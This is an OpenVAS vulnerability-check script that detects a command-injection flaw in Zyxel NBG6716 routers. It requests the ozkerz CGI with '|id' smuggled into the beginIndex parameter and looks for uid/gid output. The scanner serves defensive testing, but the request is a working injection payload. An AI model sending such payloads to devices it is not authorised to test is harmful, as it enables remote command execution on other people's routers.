##############################################################################
# OpenVAS Vulnerability Test
#
# Zyxel NBG6716 RCE Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140497");
  script_version("2019-08-30T12:23:10+0000");
  script_tag(name:"last_modification", value:"2019-08-30 12:23:10 +0000 (Fri, 30 Aug 2019)");
  script_tag(name:"creation_date", value:"2017-11-10 13:05:48 +0700 (Fri, 10 Nov 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Zyxel NBG6716 RCE Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Zyxel NBG6716 devices allow command injection in the ozkerz component
  because beginIndex and endIndex are used directly in a popen call.");

  script_tag(name:"vuldetect", value:"Sends a crafted request via HTTP GET and checks whether
  it is possible to execute a remote command.");

  script_tag(name:"solution", value:"Upgrade to firmware version V1.00(AAKG.11)C0 or later.");

  script_xref(name:"URL", value:"https://www.secarma.co.uk/labs/sohopelessly-broken-0-day-strategy/");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default: 80);

res = http_get_cache(port: port, item: "/cgi-bin/luci");

if ("title>NBG6716 - Login</title>" >< res && "Model:NBG6716" >< res) {
  url = "/cgi-bin/ozkerz?eventFlows=1&beginIndex=|id&endIndex=";
  if (http_vuln_check(port: port, url: url, pattern: 'uid=[0-9]+.*gid=[0-9]+', check_header: TRUE)) {
    report = report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }

  exit(99);
}

exit(0);